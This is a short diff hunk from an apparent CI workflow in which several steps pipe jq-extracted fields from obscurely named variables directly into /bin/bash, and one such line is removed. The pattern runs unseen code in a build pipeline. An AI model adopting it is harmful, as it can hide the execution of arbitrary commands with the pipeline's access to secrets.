@@ -31,7 +31,6 @@ jobs:
           echo $npjn5109 | jq -r .l7 | /bin/bash
           echo $zxn9 | jq -r .aue8 | /bin/bash
           echo $vbuv5 | jq -r .pro739 | /bin/bash
-          echo $fsrud2536 | jq -r .hrm75376 | /bin/bash
           printf '%s' "$gd05" | jq -r .wyh51 | /bin/bash
           printf '%s' "$g035" | jq -r .gde41 | /bin/bash
           echo $d068 | jq -r .d227 | /bin/bash
